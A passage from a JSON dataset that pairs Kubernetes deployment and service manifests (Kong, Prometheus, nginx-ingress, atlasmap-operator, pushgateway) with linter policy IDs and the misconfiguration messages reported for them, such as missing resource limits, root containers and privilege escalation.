5\n          periodSeconds: 5\n          timeoutSeconds: 5\n      - name: postgres\n        image: postgres:9.6\n        env:\n        - name: POSTGRES_USER\n          value: kong\n        - name: POSTGRES_PASSWORD\n          value: kong\n        - name: POSTGRES_DB\n          value: kong\n        ports:\n        - containerPort: 5432\n        readinessProbe:\n          tcpSocket:\n            port: 5432\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kong\" has memory limit 0"
  },
  {
    "id": "8669",
    "manifest_path": "data/manifests/the_stack_sample/sample_3256.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kong-deployment\n  labels:\n    app: kong\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kong\n  template:\n    metadata:\n      labels:\n        app: kong\n    spec:\n      containers:\n      - name: kong\n        image: kong:k8s-test\n        env:\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: KONG_ADMIN_LISTEN\n          value: 0.0.0.0:8001\n        - name: KONG_PG_PASSWORD\n          value: kong\n        - name: KONG_PG_HOST\n          value: $(POD_IP)\n        ports:\n        - containerPort: 8001\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while [ 0 ]; do (kong migrations bootstrap || kong migrations up) && break;\n          sleep 1; done && /docker-entrypoint.sh kong docker-start\n        readinessProbe:\n          httpGet:\n            path: /signalfx\n            port: 8001\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n      - name: postgres\n        image: postgres:9.6\n        env:\n        - name: POSTGRES_USER\n          value: kong\n        - name: POSTGRES_PASSWORD\n          value: kong\n        - name: POSTGRES_DB\n          value: kong\n        ports:\n        - containerPort: 5432\n        readinessProbe:\n          tcpSocket:\n            port: 5432\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          timeoutSeconds: 5\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"postgres\" has memory limit 0"
  },
  {
    "id": "8670",
    "manifest_path": "data/manifests/the_stack_sample/sample_3258.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: kube-dns\n  namespace: kube-system\n  labels:\n    k8s-app: kube-dns\n    addonmanager.kubernetes.io/mode: Reconcile\n    kubernetes.io/name: KubeDNS\nspec:\n  selector:\n    k8s-app: kube-dns\n  clusterIP: 10.96.0.10\n  ports:\n  - name: dns\n    port: 53\n    protocol: UDP\n  - name: dns-tcp\n    port: 53\n    protocol: TCP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[k8s-app:kube-dns])"
  },
  {
    "id": "8671",
    "manifest_path": "data/manifests/the_stack_sample/sample_3259.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: atlasmap-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: atlasmap-operator\n  template:\n    metadata:\n      labels:\n        name: atlasmap-operator\n    spec:\n      serviceAccountName: atlasmap-operator\n      containers:\n      - name: atlasmap-operator\n        image: docker.io/atlasmap/atlasmap-operator\n        ports:\n        - containerPort: 8383\n          name: metrics\n        command:\n        - atlasmap-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: atlasmap-operator\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"atlasmap-operator\" is using an invalid container image, \"docker.io/atlasmap/atlasmap-operator\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8672",
    "manifest_path": "data/manifests/the_stack_sample/sample_3259.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: atlasmap-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: atlasmap-operator\n  template:\n    metadata:\n      labels:\n        name: atlasmap-operator\n    spec:\n      serviceAccountName: atlasmap-operator\n      containers:\n      - name: atlasmap-operator\n        image: docker.io/atlasmap/atlasmap-operator\n        ports:\n        - containerPort: 8383\n          name: metrics\n        command:\n        - atlasmap-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: atlasmap-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"atlasmap-operator\" does not have a read-only root file system"
  },
  {
    "id": "8673",
    "manifest_path": "data/manifests/the_stack_sample/sample_3259.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: atlasmap-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: atlasmap-operator\n  template:\n    metadata:\n      labels:\n        name: atlasmap-operator\n    spec:\n      serviceAccountName: atlasmap-operator\n      containers:\n      - name: atlasmap-operator\n        image: docker.io/atlasmap/atlasmap-operator\n        ports:\n        - containerPort: 8383\n          name: metrics\n        command:\n        - atlasmap-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: atlasmap-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"atlasmap-operator\" not found"
  },
  {
    "id": "8674",
    "manifest_path": "data/manifests/the_stack_sample/sample_3259.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: atlasmap-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: atlasmap-operator\n  template:\n    metadata:\n      labels:\n        name: atlasmap-operator\n    spec:\n      serviceAccountName: atlasmap-operator\n      containers:\n      - name: atlasmap-operator\n        image: docker.io/atlasmap/atlasmap-operator\n        ports:\n        - containerPort: 8383\n          name: metrics\n        command:\n        - atlasmap-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: atlasmap-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"atlasmap-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "8675",
    "manifest_path": "data/manifests/the_stack_sample/sample_3259.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: atlasmap-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: atlasmap-operator\n  template:\n    metadata:\n      labels:\n        name: atlasmap-operator\n    spec:\n      serviceAccountName: atlasmap-operator\n      containers:\n      - name: atlasmap-operator\n        image: docker.io/atlasmap/atlasmap-operator\n        ports:\n        - containerPort: 8383\n          name: metrics\n        command:\n        - atlasmap-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: atlasmap-operator\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"atlasmap-operator\" has cpu request 0"
  },
  {
    "id": "8676",
    "manifest_path": "data/manifests/the_stack_sample/sample_3259.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: atlasmap-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: atlasmap-operator\n  template:\n    metadata:\n      labels:\n        name: atlasmap-operator\n    spec:\n      serviceAccountName: atlasmap-operator\n      containers:\n      - name: atlasmap-operator\n        image: docker.io/atlasmap/atlasmap-operator\n        ports:\n        - containerPort: 8383\n          name: metrics\n        command:\n        - atlasmap-operator\n        imagePullPolicy: Always\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: atlasmap-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"atlasmap-operator\" has memory limit 0"
  },
  {
    "id": "8677",
    "manifest_path": "data/manifests/the_stack_sample/sample_3260.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx-plus-ingress:2.2.0\n        imagePullPolicy: IfNotPresent\n        name: nginx-plus-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        - name: readiness-port\n          containerPort: 8081\n        - name: prometheus\n          containerPort: 9113\n        readinessProbe:\n          httpGet:\n            path: /nginx-ready\n            port: readiness-port\n          periodSeconds: 1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        securityContext:\n          allowPrivilegeEscalation: true\n          runAsUser: 101\n          runAsNonRoot: true\n          capabilities:\n            drop:\n            - ALL\n            add:\n            - NET_BIND_SERVICE\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-plus\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-plus-ingress\" does not have a read-only root file system"
  },
  {
    "id": "8678",
    "manifest_path": "data/manifests/the_stack_sample/sample_3260.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx-plus-ingress:2.2.0\n        imagePullPolicy: IfNotPresent\n        name: nginx-plus-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        - name: readiness-port\n          containerPort: 8081\n        - name: prometheus\n          containerPort: 9113\n        readinessProbe:\n          httpGet:\n            path: /nginx-ready\n            port: readiness-port\n          periodSeconds: 1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        securityContext:\n          allowPrivilegeEscalation: true\n          runAsUser: 101\n          runAsNonRoot: true\n          capabilities:\n            drop:\n            - ALL\n            add:\n            - NET_BIND_SERVICE\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-plus\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"nginx-ingress\" not found"
  },
  {
    "id": "8679",
    "manifest_path": "data/manifests/the_stack_sample/sample_3260.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx-plus-ingress:2.2.0\n        imagePullPolicy: IfNotPresent\n        name: nginx-plus-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        - name: readiness-port\n          containerPort: 8081\n        - name: prometheus\n          containerPort: 9113\n        readinessProbe:\n          httpGet:\n            path: /nginx-ready\n            port: readiness-port\n          periodSeconds: 1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        securityContext:\n          allowPrivilegeEscalation: true\n          runAsUser: 101\n          runAsNonRoot: true\n          capabilities:\n            drop:\n            - ALL\n            add:\n            - NET_BIND_SERVICE\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-plus\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"nginx-plus-ingress\" has AllowPrivilegeEscalation set to true."
  },
  {
    "id": "8680",
    "manifest_path": "data/manifests/the_stack_sample/sample_3260.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx-plus-ingress:2.2.0\n        imagePullPolicy: IfNotPresent\n        name: nginx-plus-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        - name: readiness-port\n          containerPort: 8081\n        - name: prometheus\n          containerPort: 9113\n        readinessProbe:\n          httpGet:\n            path: /nginx-ready\n            port: readiness-port\n          periodSeconds: 1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        securityContext:\n          allowPrivilegeEscalation: true\n          runAsUser: 101\n          runAsNonRoot: true\n          capabilities:\n            drop:\n            - ALL\n            add:\n            - NET_BIND_SERVICE\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-plus\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-plus-ingress\" has memory limit 0"
  },
  {
    "id": "8681",
    "manifest_path": "data/manifests/the_stack_sample/sample_3261.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: apidemo-service\nspec:\n  selector:\n    app: apidemo\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 9000\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:apidemo])"
  },
  {
    "id": "8682",
    "manifest_path": "data/manifests/the_stack_sample/sample_3262.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prometheus\n        imagePullPolicy: Always\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        command:\n        - /bin/prometheus\n        ports:\n        - name: http\n          containerPort: 9090\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/prometheus\n        - name: data\n          mountPath: /prometheus\n      securityContext: {}\n      serviceAccountName: prometheus\n      volumes:\n      - name: config-volume\n        configMap:\n          name: prometheus-config\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"prometheus\" is using an invalid container image, \"prometheus\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8683",
    "manifest_path": "data/manifests/the_stack_sample/sample_3262.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prometheus\n        imagePullPolicy: Always\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        command:\n        - /bin/prometheus\n        ports:\n        - name: http\n          containerPort: 9090\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/prometheus\n        - name: data\n          mountPath: /prometheus\n      securityContext: {}\n      serviceAccountName: prometheus\n      volumes:\n      - name: config-volume\n        configMap:\n          name: prometheus-config\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus\" does not have a read-only root file system"
  },
  {
    "id": "8684",
    "manifest_path": "data/manifests/the_stack_sample/sample_3262.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prometheus\n        imagePullPolicy: Always\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        command:\n        - /bin/prometheus\n        ports:\n        - name: http\n          containerPort: 9090\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/prometheus\n        - name: data\n          mountPath: /prometheus\n      securityContext: {}\n      serviceAccountName: prometheus\n      volumes:\n      - name: config-volume\n        configMap:\n          name: prometheus-config\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prometheus\" not found"
  },
  {
    "id": "8685",
    "manifest_path": "data/manifests/the_stack_sample/sample_3262.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prometheus\n        imagePullPolicy: Always\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        command:\n        - /bin/prometheus\n        ports:\n        - name: http\n          containerPort: 9090\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/prometheus\n        - name: data\n          mountPath: /prometheus\n      securityContext: {}\n      serviceAccountName: prometheus\n      volumes:\n      - name: config-volume\n        configMap:\n          name: prometheus-config\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prometheus\" is not set to runAsNonRoot"
  },
  {
    "id": "8686",
    "manifest_path": "data/manifests/the_stack_sample/sample_3262.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prometheus\n        imagePullPolicy: Always\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        command:\n        - /bin/prometheus\n        ports:\n        - name: http\n          containerPort: 9090\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/prometheus\n        - name: data\n          mountPath: /prometheus\n      securityContext: {}\n      serviceAccountName: prometheus\n      volumes:\n      - name: config-volume\n        configMap:\n          name: prometheus-config\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prometheus\" has cpu request 0"
  },
  {
    "id": "8687",
    "manifest_path": "data/manifests/the_stack_sample/sample_3262.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prometheus\n        imagePullPolicy: Always\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        command:\n        - /bin/prometheus\n        ports:\n        - name: http\n          containerPort: 9090\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/prometheus\n        - name: data\n          mountPath: /prometheus\n      securityContext: {}\n      serviceAccountName: prometheus\n      volumes:\n      - name: config-volume\n        configMap:\n          name: prometheus-config\n      - name: data\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prometheus\" has memory limit 0"
  },
  {
    "id": "8688",
    "manifest_path": "data/manifests/the_stack_sample/sample_3265.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pushgateway\n  namespace: monitoring\nspec:\n  selector:\n    matchLabels:\n      p8s-app: pushgateway\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        p8s-app: pushgateway\n    spec:\n      containers:\n      - name: pushgateway\n        image: prom/pushgateway:v0.7.0\n        ports:\n        - name: push-port\n          containerPort: 9091\n        readinessProbe:\n          httpGet:\n            path: /-/ready\n            port: 9091\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 100m\n            memory: 48Mi\n          requests:\n            cpu: 50m\n            memory: 24Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pushgateway\" does not have a read-only root file system"
  },
  {
    "id": "8689",
    "manifest_path": "data/manifests/the_stack_sample/sample_3265.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pushgateway\n  namespace: monitoring\nspec:\n  selector:\n    matchLabels:\n      p8s-app: pushgateway\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        p8s-app: pushgateway\n    spec:\n      containers:\n      - name: pushgateway\n        image: prom/pushgateway:v0.7.0\n        ports:\n        - name: push-port\n          containerPort: 9091\n        readinessProbe:\n          httpGet:\n            path: /-/ready\n            port: 9091\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 100m\n            memory: 48Mi\n          requests:\n            cpu: 50m\n            memory: 24Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pushgateway\" is not set to runAsNonRoot"
  },
  {
    "id": "8690",
    "manifest_path": "data/manifests/the_stack_sample/sample_3266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: ingress-nginx\n    app.kubernetes.io/part-of: ingress-nginx\n  name: nginx-ingress-controller\n  namespace: ingress-nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ingress-nginx\n      app.kubernetes.io/part-of: ingress-nginx\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '10254'\n        prometheus.io/scrape: 'true'\n      labels:\n        app.kubernetes.io/name: ingress-nginx\n        app.kubernetes.io/part-of: ingress-nginx\n    spec:\n      containers:\n      - args:\n        - /nginx-ingress-controller\n        - --configmap=$(POD_NAMESPACE)/nginx-configuration\n        - --tcp-services-configmap=$(POD_NAMESPACE)/tcp-services\n        - --udp-services-configmap=$(POD_NAMESPACE)/udp-services\n        - --publish-service=$(POD_NAMESPACE)/ingress-nginx\n        - --annotations-prefix=nginx.ingress.kubernetes.io\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.22.0\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: nginx-ingress-controller\n        ports:\n        - containerPort: 80\n          name: http\n        - containerPort: 443\n          name: https\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - ALL\n          runAsUser: 33\n      serviceAccountName: nginx-ingress-serviceaccount\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"nginx-ingress-controller\" does not expose port 10254 for the HTTPGet"
  },
  {
    "id": "8691",
    "manifest_path": "data/manifests/the_stack_sample/sample_3266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: ingress-nginx\n    app.kubernetes.io/part-of: ingress-nginx\n  name: nginx-ingress-controller\n  namespace: ingress-nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ingress-nginx\n      app.kubernetes.io/part-of: ingress-nginx\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '10254'\n        prometheus.io/scrape: 'true'\n      labels:\n        app.kubernetes.io/name: ingress-nginx\n        app.kubernetes.io/part-of: ingress-nginx\n    spec:\n      containers:\n      - args:\n        - /nginx-ingress-controller\n        - --configmap=$(POD_NAMESPACE)/nginx-configuration\n        - --tcp-services-configmap=$(POD_NAMESPACE)/tcp-services\n        - --udp-services-configmap=$(POD_NAMESPACE)/udp-services\n        - --publish-service=$(POD_NAMESPACE)/ingress-nginx\n        - --annotations-prefix=nginx.ingress.kubernetes.io\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.22.0\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: nginx-ingress-controller\n        ports:\n        - containerPort: 80\n          name: http\n        - containerPort: 443\n          name: https\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        securityContext:\n          allowPrivilegeEscalation: true\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - ALL\n          runAsUser: 33\n      serviceAccountName: nginx-ingress-serviceaccount\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-ingress-controller\" does not have a read-only root file system"
  },
  {
    "id": "8692",
    "manifest_path": "data/manifests/the_stack_sample/sample_3266.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: ingress-nginx\n    app.kubernetes.io/part-of: ingress-nginx\n  name: nginx-ingress-controller\n  namespace: ingress-nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: ingress-nginx\n      app.kubernetes.io/part-of: ingress-nginx\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '10254'\n        prometheus.io/scrape: 'true'\n      labels:\n        app.kubernetes.io/name: ingress-nginx\n        app.kubernetes.io/part-of: ingress-nginx\n    spec:\n      containers:\n      - args:\n        - /nginx-ingress-controller\n        - --configmap=$(POD_NAMESPACE)/nginx-configuration\n        - --tcp-services-configmap=$(POD_NAMESPACE)/tcp-services\n        - --udp-services-configmap=$(POD_NAMESPACE)/udp-services\n        - --publish-service=$(POD_NAMESPACE)/ingress-nginx\n        - --annotations-prefix=nginx.ingress.kubernetes.io\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.22.0\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: nginx-ingress-controller\n        ports:\n        - containerPort: 80\n          name: http\n        - containerPort: 443\n          name: https\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n    